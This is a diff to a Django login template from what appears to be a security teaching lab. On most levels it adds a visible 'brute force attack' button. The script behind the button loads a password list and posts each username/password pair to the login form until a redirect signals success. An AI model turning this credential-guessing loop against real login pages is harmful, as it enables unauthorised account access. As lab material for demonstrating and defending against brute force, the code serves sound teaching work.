@@ -55,7 +55,7 @@
           </ul>
           {% endif %}
 
-          <form method="post" class="login-form">
+          <form method="post" class="login-form" id="loginForm">
             {% csrf_token %}
             <label for="username">Usuário:</label>
             <input type="text" id="username" name="username" required />
@@ -63,12 +63,115 @@
             <label for="password">Senha:</label>
             <input type="password" id="password" name="password" required />
 
-            <button type="submit">Entrar</button>
+            <button type="submit" id="loginButton">Entrar</button>
 
             <div class="social-login"></div>
           </form>
+
+          {% if level != 3 %}
+          <button id="bruteForceBtn" class="brute-force-btn">
+            Iniciar Ataque de Força Bruta
+          </button>
+          <div
+            id="bruteForceStatus"
+            style="
+              margin-top: 15px;
+              font-size: 0.9em;
+              color: #cc0000;
+              font-weight: bold;
+            "
+          ></div>
+          {% endif %}
         </div>
       </div>
     </div>
+
+    {% if level != 3 %}
+    <script>
+      document.addEventListener("DOMContentLoaded", () => {
+        const bruteForceBtn = document.getElementById("bruteForceBtn");
+        const statusDiv = document.getElementById("bruteForceStatus");
+        const usernameInput = document.getElementById("username");
+        const passwordInput = document.getElementById("password");
+        const csrfToken = document.querySelector(
+          "[name=csrfmiddlewaretoken]"
+        ).value;
+        const form = document.getElementById("loginForm");
+
+        if (bruteForceBtn) {
+          bruteForceBtn.addEventListener("click", async () => {
+            bruteForceBtn.disabled = true;
+            statusDiv.innerHTML = "Carregando lista de senhas...";
+
+            try {
+              // 1. Carregar o payload JSON
+              const response = await fetch(
+                '{% static "data/bruteforce_payload.json" %}'
+              );
+              if (!response.ok)
+                throw new Error("Falha ao carregar o payload JSON.");
+
+              const payload = await response.json();
+
+              statusDiv.innerHTML = `Iniciando ataque contra {{ level }} tentativas.`;
+
+              // 2. Iterar sobre o payload
+              for (let i = 0; i < payload.length; i++) {
+                const attempt = payload[i];
+
+                // Atualiza os campos do formulário para visualização
+                usernameInput.value = attempt.username;
+                passwordInput.value = attempt.password;
+
+                statusDiv.innerHTML = `Tentativa ${i + 1}/${
+                  payload.length
+                }: Usuário: ${attempt.username}, Senha: ${
+                  attempt.password
+                } - Tentando...`;
+
+                // Simular a requisição de login
+                const loginResponse = await fetch(form.action, {
+                  method: "POST",
+                  headers: {
+                    "Content-Type": "application/x-www-form-urlencoded",
+                    "X-CSRFToken": csrfToken,
+                  },
+                  // Montar os dados do formulário
+                  body: new URLSearchParams({
+                    username: attempt.username,
+                    password: attempt.password,
+                    csrfmiddlewaretoken: csrfToken,
+                  }),
+                });
+
+                // 3. Verificar o resultado
+                // Em Django, um login bem-sucedido geralmente redireciona (status 302).
+                // Um ataque bem-sucedido é detectado se o redirecionamento for para a dashboard.
+                if (loginResponse.redirected) {
+                  statusDiv.innerHTML = `<span style="color: green;">SUCESSO!</span> Senha encontrada na tentativa ${
+                    i + 1
+                  }. Redirecionando...`;
+                  // Redirecionar manualmente para a página de sucesso
+                  window.location.href = loginResponse.url;
+                  return;
+                }
+
+                // Pequena pausa para simular o tempo de rede/processamento
+                await new Promise((resolve) => setTimeout(resolve, 300));
+              }
+
+              statusDiv.innerHTML =
+                "Ataque concluído. Senha não encontrada na lista fornecida.";
+            } catch (error) {
+              console.error(error);
+              statusDiv.innerHTML = `<span style="color: red;">ERRO:</span> ${error.message}`;
+            } finally {
+              bruteForceBtn.disabled = false;
+            }
+          });
+        }
+      });
+    </script>
+    {% endif %}
   </body>
 </html>
